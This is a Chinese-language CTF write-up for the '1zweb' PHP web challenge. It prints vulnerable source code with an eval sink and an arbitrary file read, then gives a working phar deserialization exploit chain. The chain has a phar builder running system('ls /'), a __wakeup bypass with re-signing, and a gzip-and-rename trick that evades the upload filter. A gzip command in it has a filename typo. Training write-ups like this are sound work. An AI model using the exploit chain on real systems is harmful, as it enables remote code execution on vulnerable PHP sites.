# 【NSSRound#4 SWPU】1zweb


# [NSSRound#4 SWPU]1zweb

## 思路
* 非预期解（就是很直接🤑）

  * 直接使用file://伪协议读文件

    ```
    查询文件处
    file:///flag
    /flag
    ```

* 正常解题

  读文件处直接读取index.php， upload.php的源码
  
  &gt; 这里需要看页面源码，因为被注释一部分
  
  index.php
  
  ```
  &lt;!--index.php--&gt;
  &lt;?php
  class LoveNss{
      public $ljt;
      public $dky;
      public $cmd;
      public function __construct(){
          $this-&gt;ljt=&#34;ljt&#34;;
          $this-&gt;dky=&#34;dky&#34;;
          phpinfo();
      }
      public function __destruct(){
          if($this-&gt;ljt===&#34;Misc&#34;&amp;&amp;$this-&gt;dky===&#34;Re&#34;)
              eval($this-&gt;cmd);
      }
      public function __wakeup(){
          $this-&gt;ljt=&#34;Re&#34;;
          $this-&gt;dky=&#34;Misc&#34;;
      }
  }
  $file=$_POST[&#39;file&#39;];
  if(isset($_POST[&#39;file&#39;])){
      echo file_get_contents($file);
  }
  ```
  
  `file_get_content` 可以触发 phar 反序列化，但是要绕过`__wakeup` 
  
  upload.php
  
  ```
  &lt;!--upload.php--&gt;
  &lt;?php
  if ($_FILES[&#34;file&#34;][&#34;error&#34;] &gt; 0){
      echo &#34;上传异常&#34;;
  }
  else{
      $allowedExts = array(&#34;gif&#34;, &#34;jpeg&#34;, &#34;jpg&#34;, &#34;png&#34;);
      $temp = explode(&#34;.&#34;, $_FILES[&#34;file&#34;][&#34;name&#34;]);
      $extension = end($temp);
      if (($_FILES[&#34;file&#34;][&#34;size&#34;] &amp;&amp; in_array($extension, $allowedExts))){
          $content=file_get_contents($_FILES[&#34;file&#34;][&#34;tmp_name&#34;]);
          $pos = strpos($content, &#34;__HALT_COMPILER();&#34;);
          if(gettype($pos)===&#34;integer&#34;){
              echo &#34;ltj一眼就发现了phar&#34;;
          }else{
              if (file_exists(&#34;./upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;])){
                  echo $_FILES[&#34;file&#34;][&#34;name&#34;] . &#34; 文件已经存在&#34;;
              }else{
                  $myfile = fopen(&#34;./upload/&#34;.$_FILES[&#34;file&#34;][&#34;name&#34;], &#34;w&#34;);
                  fwrite($myfile, $content);
                  fclose($myfile);
                  echo &#34;上传成功 ./upload/&#34;.$_FILES[&#34;file&#34;][&#34;name&#34;];
              }
          }
      }else{
          echo &#34;dky不喜欢这个文件 .&#34;.$extension;
      }
  }
  ?&gt;
  ```
  
  * 对上传的文件进行了 gif、jpeg、jpg、png 的后缀名检测
  * 在上传的文件内容中搜索`__HALT_COMPILER ()`; 第一次出现的位置，搜索到即 echo 发现 phar，否则如果文件不存在则上传成功
  * 对 phar 文件内容进行检测，要求不能存在 `__HALT_COMPILER();`
  
* `__wakeup`绕过

  修改序列化成员名数量

  但是需要重新签名

* 绕过`__HALT_COMPILER();`检测

  通过zip加密

## EXP

先生成phar反序列化文件

```
&lt;?php
class LoveNss{
    public $ljt=&#34;Misc&#34;;
    public $dky=&#34;Re&#34;;
    public $cmd=&#34;system(&#39;ls /&#39;);&#34;;
}

$a = new LoveNss();

$phar = new Phar(&#34;phar.phar&#34;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); //设置stub
$phar-&gt;setMetadata($a); //自定义的meta-data
$phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); //添加要压缩的文件
//签名自动计算,默认是SHA1
$phar-&gt;stopBuffering();
```

然后修改phar.phar的序列化值。

&gt; 用hex查看原文

然后重新签名

```
from hashlib import sha1

file = open(&#39;phar.phar&#39;, &#39;rb&#39;).read()

data = file[:-28]  # 要签名的部分是文件头到metadata的数据。

final = file[-8:]

newfile = data &#43; sha1(data).digest() &#43; final

open(&#39;newpoc.phar&#39;, &#39;wb&#39;).write(newfile)
```

然后重命名，绕过检测phar

```
&lt;?php
system(&#34;gzip newpoc.phra&#34;);
rename(&#34;newpoc.phar.gz&#34;, &#34;1.jpg&#34;);
```




## 总结
* phar反序列化
* 文件上传

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-nssround%234-swpu1zweb/  

